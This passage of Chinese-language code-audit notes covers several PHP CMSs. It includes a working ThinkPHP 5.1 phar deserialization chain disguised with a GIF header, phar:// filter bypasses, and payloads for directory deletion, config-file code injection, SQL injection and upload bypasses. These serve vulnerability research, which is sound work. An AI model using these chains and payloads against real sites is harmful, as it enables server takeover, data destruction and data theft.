### phar生成
```
<?php
    class TestObject {
    }
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $o -> data='hu3sky';
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>

```
### phar文件必要的结构组成
>stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?> 结尾，否则无法识别。xxx可以为自定义内容。

>manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。

>content:被压缩文件的内容

>signature (可空):签名，放在末尾。

### 绕过方法：
环境限制phar不能出现在前面的字符中，可以使用`compress.bzip2://`和`compress.bzip://`进行绕过

```
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt

```

或者使用其他协议

```
php://filter/read=convert.base64-encode/resource=phar://phar.phar


```

GIF格式验证中可以通过在文件头部添加GIT89a绕过

```
- $phar->setStub("GIF89a","<?php __HALT_COMPILER();?>");

- 生成一个phar.phar 改名为phar.gif
```

### 危害

攻击者可以通过PHAR反序列化漏洞来实现一下攻击：
1. 远程代码执行：攻击者可以利用反序列化漏洞来远程执行任意php代码并获取服务器完全控制权
2. 信息泄露：攻击者可以利用反序列化漏洞来读取服务器上的敏感数据，如数据库凭证，身份验证密码等
3. 篡改数据：攻击者可以利用反序列化漏洞改变服务器上的数据，如篡改网站内容，篡改数据库数据等

### 防范措施

1. 及时更新代码中利用phar的库或插件，以修复已知的漏洞
2. 对用户输入的信息进行过滤和验证，确保输入的数据不包含恶意代码
3. 金庸不必要的反序列化对象或者对反序列化对象进行严格控制
4. 使用php的反序列化检测攻击检查潜在的远程代码执行漏洞

这里的`$dir`参数完全可控，并且进入`is_dir()`

![](https://pic.imgdb.cn/item/670a40cdd29ded1a8cb1d949.png)

写tp5.1反序列化利用链生成phar文件
```
<?php
namespace think\process\pipes {
  class Windows
 {
    private $files;
    public function __construct($files)
   {
      $this->files = [$files];
   }
 }
}
namespace think\model\concern {
  trait Conversion
 {
 }
  trait Attribute
 {
    private $data;
    private $withAttr = ["v" => "system"];
    public function get()
   {
      $this->data = ["v" => "calc"];
   }
 }
#这里生成我们的pahr文件，如果生成时报错了可以将php.ini配置文件中的phar.readonly选项设置为
#Off就可以成功生成了。

}
namespace think {
  abstract class Model
 {
    use model\concern\Attribute;
    use model\concern\Conversion;
 }
}
namespace think\model{
  use think\Model;
  class Pivot extends Model
 {
    public function __construct()
   {
      $this->get();
   }
 }
}
namespace {
  $conver = new think\model\Pivot();
  $a = new think\process\pipes\Windows($conver);
  @unlink("phar.phar");
  $phar = new Phar("phar.phar"); //后缀名必须为phar
  $phar->startBuffering();
  $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置stub
  $phar->setMetadata($a); //将自定义的meta-data存入manifest
  $phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
  $phar->stopBuffering();
}
?>
```

打开访问会自动生成`phar.phar`（如果报错的话是因为你的`php.ini`里面没打开`phar_onreadly=off`）

![](https://pic.imgdb.cn/item/670b4891d29ded1a8c85b6c1.png)

在010editor里面能看到我们的数据都写进去了

![](https://pic.imgdb.cn/item/670b48b0d29ded1a8c85ccf0.png)

漏洞复现里面是在kitecms里面上传了phar.phar，改后缀为`.jpg`,

![](https://pic.imgdb.cn/item/670b4912d29ded1a8c861136.png)

用phar协议解析就可以弹计算器

![](https://pic.imgdb.cn/item/670b4949d29ded1a8c8636fb.png)

![](https://pic.imgdb.cn/item/670b497ad29ded1a8c865846.png)

顺便补一句这个下面的`$dir`也是可控的，所以也可以利用

http://127.0.0.1/admin/admin/scanFilesForTree?dir=phar://地址

## 日志文件泄露

![](https://pic.imgdb.cn/item/670b4ff7d29ded1a8c8e0aa3.png)

在`config/app.php/log`中开启了调试模式，

![](https://pic.imgdb.cn/item/670b505bd29ded1a8c8f353c.png)

也就是说开启了日志记录

https://pic.imgdb.cn/item/670b50a9d29ded1a8c902826.png

在日志配置文件`config/log.php`里面发现默认开启了日志记录

访问`/runtime/log`目录，使用bp求情就能得到log日志文件

## 文件上传第二处

`application/member/controller/Upload.php`

![](https://pic.imgdb.cn/item/670b524ed29ded1a8c983e37.png)

跟踪一下`upload`函数发现

他只检查了后缀和大小，

![](https://pic.imgdb.cn/item/670b52b8d29ded1a8c993f0a.png)

所以可以在会员中心，对着这个

![](https://pic.imgdb.cn/item/670b5317d29ded1a8c9a4b8d.png)

然后修改上传的png为php

![](https://pic.imgdb.cn/item/670b532fd29ded1a8c9aca51.png)

就能访问到phpinfo文件了

---

# 5. zzcms代码审计（2024年10月13日）

## 框架目录

```
/install 安装程序目录（安装时必须有可写入权限）
/admin 默认后台管理目录（可任意改名）
/user 注册用户管理程序存放目录
/skin 用户网站模板存放目录;
/template 系统模板存放目录;
/inc 系统所用包含文件存放目录
/area 各地区显示文件存放目录
/zhaoshang 招商程序文件存放目录
/daili 代理
/zhanhui 展会
/company 企业
/job 招聘
/zixun 资讯
/special专题
/pinpai 品牌
/wangkan 网络刊物
/zhanting 注册用户展厅页程序
/one 专存放单页面，如公司简介页，友情链接页，帮助页都放在这个目录里了
/ajax ajax程序处理页面
/reg 用户注册页面
/3 第三方插件存放目录
  /3/ckeditor CK编缉器程序存放目录
  /3/alipay 支付宝在线支付系统存放目录
  /3/tenpay 财富通在线支付系统存放目录
  /3/qq_connect2.0 qq登陆接口文件
  /3/ucenter_api discuz论坛用户同步登陆接口文件
  /3/kefu 在线客服代码
  /3/mobile_msg 第三方手机短信API
  /3/phpexcelreader PHP读取excel文件组件
/cache 缓存文件放目录
/html 生成的静态页存放目录
/uploadfiles 上传文件存放目录
/daili_excel 要导入的代理信息excel表格文件上传目录
/image 程序设计图片,swf文件存放目录
/flash 展厅用透明flash装饰动画存放目录
/js js文件存放目录
/web.config 伪静态规则文件适用于 iis7服务器(万网比较常用)
/httpd.ini 伪静态规则文件适用于 iis6服务器
/.htaccess 伪静态规则文件适用于Apache 服务器
/nginx.conf 伪静态规则文件适用Nginx服务器


```


## 前台任意文件写入

使用Fortify自动审计工具时发现可能存在一个xxe漏洞，

![](https://pic.imgdb.cn/item/670bd341d29ded1a8c22360b.png)

`xml_parse`解析xml文档，搜索他的方法`parse`

![](https://pic.imgdb.cn/item/670be4bdd29ded1a8c316f6f.png)

发现`xml_unserialize`对`parse()`函数进行了调用，再去搜索

![](https://pic.imgdb.cn/item/670ca7d5d29ded1a8cb97562.png)

这里是从post中获取原始的数据流

上面的ertu`parse_Str`是将解码后的字符串解析为变量并存储在`$get`中，而上面的`$code`可控，而`$code`经过`_authcode`的处理，跟进一下发现大概是加解密字符串的,`$string`是需要加解密的字符串，也就是`$code`，$operation 默认为DECODE也就是解密字符串，而 $key 则为加解密的秘钥。

 > 他说这里的默认密钥是123456，我真没看出来那里说了是123456

![](https://pic.imgdb.cn/item/670cb03bd29ded1a8cbfbc47.png)

因为`code`可控，所以下面的`$time,$action`可控

59行判断传入的`$action`是否在数组中,是的话继续运行并讲`$get,post`以参数形式传输，所以`$get,post`也可控

![](https://pic.imgdb.cn/item/670cb021d29ded1a8cbfab99.png)

所以我们可以去数组中找找有没有危险操作的

`updateapps`里面有一个`fwrite`,接收的`UC-API`可控，而且下面的fwrite是将我们输入的信息进行正则匹配进行替换，所以可以实现任意文件读写

![](https://pic.imgdb.cn/item/670cb35ed29ded1a8cc1fae5.png)

### 测试

因为这里的东西限制了我们两条

![](https://pic.imgdb.cn/item/670cf31fd29ded1a8c04ac38.png)

1. `$timestamp - $get['time'] > 3600`
2. `$get['action']=updateapps;`

并且要经过_authcode（）解码，所以我们要先讲`$code`编码

这里我也找到了`UC-KEY`---他在配置文件中说是默认为123456，也就解释了上面的123456的默认

![](https://pic.imgdb.cn/item/670cfc0bd29ded1a8c0e4d6e.png)

![](https://pic.imgdb.cn/item/670d0d19d29ded1a8c270940.png)

这里说明了要按照xml的格式进行编写，所以就有了

![](https://pic.imgdb.cn/item/670cfc81d29ded1a8c0edb68.png)

![](https://pic.imgdb.cn/item/670cfc9bd29ded1a8c0ef622.png)


## 任意文件删除

全局搜索`unlink`的时候发现这么一个东西

![](https://pic.imgdb.cn/item/670d1e79d29ded1a8c3cc9bb.png)

追踪一下`unlink`的`file`发现`action`和`mlname`可控

![](https://pic.imgdb.cn/item/670d1fb3d29ded1a8c3ddba1.png)

![](https://pic.imgdb.cn/item/670d202fd29ded1a8c3e5137.png)

这里的`mlname`可控，他传入文件夹名给`ml`然后遍历整个文件夹下的文件，最将文件名赋值给`file`然后通过`unlink`删除

当文件夹下的文件全部被删除后再通过`rmdir`删除传入的文件夹

payload：
```
/admin/uploadfile_nouse.php?action=del&mlname=..\文件夹名字

```

## 前端xss漏洞

该系统没有按照mvc开发模式进行开发，导致大部分前后端代码都在一个php文件中，

![](https://pic.imgdb.cn/item/670def3bd29ded1a8cd10b09.png)

这里的两个参数`imgid`和`noshuiyin`参数可控，

![](https://pic.imgdb.cn/item/670dfa34d29ded1a8cd9de07.png)

## sql注入

这里的`classname`是可控的，从上面要求`action=modify`是一个条件，

![](https://pic.imgdb.cn/item/6710c0a3d29ded1a8c00f6b5.png)

从这php开头可以看到`dowhat`是可控的

![](https://pic.imgdb.cn/item/6710c098d29ded1a8c00ed73.png)

所以应该还有个条件是`dowhat=modifybigclass`

![](https://pic.imgdb.cn/item/6710c13dd29ded1a8c016c12.png)

```
payload=classname= xxxxxxx（自己填写sql语句）
```



## 总结：
1. 如果限制了登录失败次数像是10次这种，可以看源码中是否通过ip来进行限制的，如果是的话可以在爆破的时候将ip的第一位也爆破一下
2. sql注入的相关漏洞可以看`select *`这种的东西，后面看是否传入的参数可控
3. 还是危险函数
4. 在正常的使用中可能有些不是传统的mvn框架所以我们要对目事先录框架进行分析
5. 可以使用Fortify以及seay等工具对参数先进行分析，这样方便我们后期的审计

---

# 6. yzmcms代码审计（2024年10月21日）

路由蛮清晰的，直接开始

## 可能存在的sql注入

我在

![](https://pic.imgdb.cn/item/67163a01d29ded1a8c4857d5.png)

里面看到他所在的路由地址

![](https://pic.imgdb.cn/item/67163a2dd29ded1a8c48c83c.png)

查看本地原码的时候发现

![](https://pic.imgdb.cn/item/67163a4dd29ded1a8c4916da.png)

这里 仅仅使用了 `strip_tags`提取tablename的值，并且tablename可控，所以就猜测可能存在sql注入

但是下面的这行限制只能存在数字和字母，以及下划线，并且必须是字母开头

![](https://pic.imgdb.cn/item/67163abbd29ded1a8c4a0f0d.png)

但是我一时没想到只有数字和字母的sql语句

## xss and upload?

在后台设置了lv1可发布内容之后，在发布点发现两个功能点，查看xss的发现限制了

![](https://pic.imgdb.cn/item/67176595d29ded1a8c283c0e.png)

其中的`strip_tags`删除`tablename`输入中的所有php标签和html标签

后面使用了`trim`清理`alias`输入的开头和结尾的空格

这里避免了xss漏洞

而另一个

![](https://pic.imgdb.cn/item/6717660bd29ded1a8c292c0f.png)

这里面的通过`handle_upload_types`设置允许伤处啊你的文件类型以及参数

![](https://pic.imgdb.cn/item/67176662d29ded1a8c29e6cf.png)

里面设置了可以传照片视频docxppt以及表格等等，但是不然上传php以及txt

后面使用了

![](https://pic.imgdb.cn/item/671766b2d29ded1a8c2a979b.png)

删除原来的上传文件的地址并设置了新的地址避免目录遍历

我尝试了使用文件包含jpg啥的都不行

![](https://pic.imgdb.cn/item/6717670dd29ded1a8c2b7aab.png)

---

# 7. hadcms代码审计（2024年10月26日）

## 任意文件写入

全局搜索`file_put_contents`的时候发现

![](https://pic.imgdb.cn/item/671ca80fd29ded1a8c0310e4.png)

往上回溯发现它是通过weitch..case来控制`file_put_contentts`的，而下面的path也就是我们通过POST传入的

23-35行对路径真实性进行了检验

如果不存在弹出路径不存在的提示并返回JSON响应,并且限制了不能创建新的文件夹

![](https://pic.imgdb.cn/item/671cadc7d29ded1a8c09fc8a.png)

所以我们确定了传入的内容`type=save`

path要求是必须真实存在的路径，

![](https://pic.imgdb.cn/item/671cb670d29ded1a8c148588.png)

suffixs一开始就限制了类型

![](https://pic.imgdb.cn/item/671cb69cd29ded1a8c14aa09.png)

这里只是判断了一下是否符合格式，但是没过滤php文件

所以可以通过nkdire来创建新测目录文件

![](https://pic.imgdb.cn/item/671cb729d29ded1a8c152efd.png)

### 测试

![](https://pic.imgdb.cn/item/671dedc5d29ded1a8c05f16c.png)

![](https://pic.imgdb.cn/item/671dedc5d29ded1a8c05f18e.png)


## 任意文件删除

在上面的基础上这里有一个

![](https://pic.imgdb.cn/item/671dee46d29ded1a8c065c5e.png)

由于上面的分析可知path和type是可控的，所以构成任意文件删除漏洞

## 任意文件删除+rce

存在任意文件删除的时候，我们可以进行locked锁文件的删除以重装，而且在重装界面我们能看到我们的数据库信息会记录到config.php中

![](https://pic.imgdb.cn/item/671f525dd29ded1a8c0b4516.png)

当我们安装的时候，就会对配置文件进行写入，但是写入的时候没有过滤，这就导致我们可以进行rce

![](https://pic.imgdb.cn/item/671f5398d29ded1a8c0d5e37.png)

后面是对数据库进行连接，创建等操作,但是不能随意输入，如果数据库执行期间报错会导致后面安装不成功，config,php无法写入


![](https://pic.imgdb.cn/item/671f5472d29ded1a8c0e1924.png)


最上面的代码限制了我们不能随意访问该文件，但是`$_G`中内容可控，经过尝试发现只有这里的 `mysql_prefix` 参数也就是数据库前缀这里是可以完全控制的，其他参数如果拼接特殊字符会导致数据库语句执行报错

config.php中可知，必须定义puyuetian常量才能正常访问该文件，所以显然不能直接访问而要通过特定路由，但是index.php中包含了puyueyian.php，所以只要能正常安装成功就能进行rce

![](https://pic.imgdb.cn/item/671f620ed29ded1a8c1e8584.png)

![](https://pic.imgdb.cn/item/671f621cd29ded1a8c1e9593.png)

### 测试

![](https://pic.imgdb.cn/item/671f6f15d29ded1a8c2c0f57.png)


```payload地方
/*!'; phpinfo();//
```

## 任意文件读取

![](https://pic.imgdb.cn/item/6725e7f7d29ded1a8c813f59.png)

注意一下前置，`suffixs`允许的尾缀是这个，前面我们分析了path可控

而且在下面发现了回显

![](https://pic.imgdb.cn/item/67262db0d29ded1a8cb7b5ec.png)

![](https://pic.imgdb.cn/item/67262db0d29ded1a8cb7b621.png)

![](https://pic.imgdb.cn/item/67262dd6d29ded1a8cb7d756.png)

## 模板上传绕过getshell

在`/app/superadmin/phpscript/app.php`中

![](https://pic.imgdb.cn/item/672739c5d29ded1a8c70d1ea.png)

有一个`		if (!InArray('hsa,zip', $suffix)) {`检查尾缀是否为.zip文件，然后在下面用到了`ziparchive::extractTo()`

![](https://pic.imgdb.cn/item/67273aa0d29ded1a8c718402.png)

```
ziparchive 部分使用方法
<?php
/******** ziparchive 可选参数 *******/
/*
1.ZipArchive::addEmptyDir
添加一个新的文件目录
2.ZipArchive::addFile
将文件添加到指定zip压缩包中。
3.ZipArchive::addFromString
添加的文件同时将内容添加进去
4.ZipArchive::close
关闭ziparchive
5.ZipArchive::extractTo
将压缩包解压
6.ZipArchive::open
打开一个zip压缩包
7.ZipArchive::getStatusString
返回压缩时的状态内容，包括错误信息，压缩信息等等
8.ZipArchive::deleteIndex
删除压缩包中的某一个文件，如：deleteIndex(0)删除第一个文件
9.ZipArchive::deleteName
删除压缩包中的某一个文件名称，同时也将文件删除。
?>

```

---

# 8. xinhucms代码审计（2024年11月8日）

信呼cms将后端代码都放置在webmain目录下，而且访问方式都是
```

index.php?a=文件名&d=文件对应名&m=模块
```

## shell

![](https://pic.imgdb.cn/item/673af490d29ded1a8c6e292a.png)
在这个地方我们发现可以看到一个上传文档点

![](https://pic.imgdb.cn/item/673af4c2d29ded1a8c6e55a2.png)

抓包发现在`upload`文件下`upload`文件的`public`模块

追踪到`uploadAction.php`里面的`upfileAjax`

![](https://pic.imgdb.cn/item/673af651d29ded1a8c6fc8f5.png)

主要是对上传文件的限制，使得他按照要求进行上传，里面调用了c函数，跳转到C函数中发现包含了`uploadchajian.php`

![](https://pic.imgdb.cn/item/673b06a0d29ded1a8c80f1f7.png)

回到原来的代码中发现第49行调用了up函数，跳转查看

![](https://pic.imgdb.cn/item/673b12a0d29ded1a8c8f6af3.png)

`issavefile()`方法是用来进行后缀判断的

![](https://pic.imgdb.cn/item/673b14e6d29ded1a8c92087f.png)

![](https://pic.imgdb.cn/item/673b14a3d29ded1a8c91b1b2.png)


白名单绕过，如果不在的话调用`filesave`函数

![](https://pic.imgdb.cn/item/673b15c5d29ded1a8c92f750.png)

这段是读取我们上传的文件内容并保存为base64编码格式，然后将代码保存为uptemp文件，最后进行删除，

![](https://pic.imgdb.cn/item/673b16bdd29ded1a8c941bf8.png)

![](https://pic.imgdb.cn/item/673b1708d29ded1a8c947201.png)

回到 `upfileAciton()` 方法中， `$upses` 接收 `up()` 方法返回的数据并将数据通过 `downChajian.php` 中`uploadback()` 方法备份到数据库，并以json形式返回

![](https://pic.imgdb.cn/item/673b179ad29ded1a8c953457.png)

我们发现这里上传到的.php文件后缀会被替换为 .uptemp 后缀的文件，并返回了上传路径

但是我们在进行关键函数的检索的时候发现了一个可以解密base64的地方，并且可以通过控制id来还原`.uptemp`后缀文件为之前上传的后缀


![](https://pic.imgdb.cn/item/673b1a42d29ded1a8c988212.png)

从这一段可以看出是上面上传处理的一个反向操作，并且通过`fileid`来控制

![](https://pic.imgdb.cn/item/673b1a8bd29ded1a8c98daf3.png)

![](https://pic.imgdb.cn/item/673dba0fd29ded1a8ce74350.png)


联系上面是fileid参数来控制上传的文件使其还原

所以我们可以通过更改fileid来控制

### 渗透测试

将fileid替换为我们上传的文件的id

![](https://pic.imgdb.cn/item/673b1b16d29ded1a8c99869b.png)

发现之前的.uptemp确实是可以被替换为.php文件后缀

![](https://pic.imgdb.cn/item/673b1b38d29ded1a8c99b1da.png)


## 文件包含

在`include_once`的时候发现一个`mpathname`可控，

![](https://pic.imgdb.cn/item/673ca031d29ded1a8cffcf11.png)

所以我们尝试跟踪这个发现他在上面被赋值了，就是71行的`$tplpaths.$tplname`
下面我们发现`tplname`的后缀是限制限制死的只能为html

![](https://pic.imgdb.cn/item/673ca045d29ded1a8cffdeea.png)

我们跟踪另外一个`mpathname`，他的代码说明是检查`$xhrock->displayfile`是否不为空，检查文件是否存在，然后重点关注这个`xhrock`,回溯到上面的是新建一个实例，然后接着回溯这个返现是可以通过控制`$m`来控制的

![](https://pic.imgdb.cn/item/673ca15dd29ded1a8c00d7b1.png)

而这里的$m是通过前端传入的

![](https://pic.imgdb.cn/item/673ca241d29ded1a8c01a37e.png)

但这里想要进入34行的if判断必须存在 $actfile 文件,而这里的 $actfile 变量是通过代码30行进行处理的。我们跟进 strformat() 函数

![](https://pic.imgdb.cn/item/673ca299d29ded1a8c01ec8a.png)

![](https://pic.imgdb.cn/item/673ca6e5d29ded1a8c059644.png)

这两个的大概内容是找到对应的php文件，而上述代码30行的` $m `是可控的,所以回到`xhrock`看`displayfile`可控的地方

![](https://pic.imgdb.cn/item/673ca7c2d29ded1a8c077d5b.png)

找到这个

`indexAction.php`的 `getshtmlAction` 函数中的 `displayfile` 变
量是通过 `$file` 进行赋值的，而 `$file` 中的 `$surl`参数是前端可控的，所以这里可以包含任意的php后缀文件。
（记得base64编码）

而`View.php`中这里我们可以控制`$m`来调用`indexAction.php`文件并且实例化文件中的`indexClassAction` 类，并且可以任意调用该类下的方法，也就是可以调用 `indexClassAction` 类下的`getshtmlAction` 方法

![](https://pic.imgdb.cn/item/673ca9acd29ded1a8c0b53f6.png)

### 渗透测试

![](https://pic.imgdb.cn/item/673ca9dbd29ded1a8c0b8fc0.png)


##
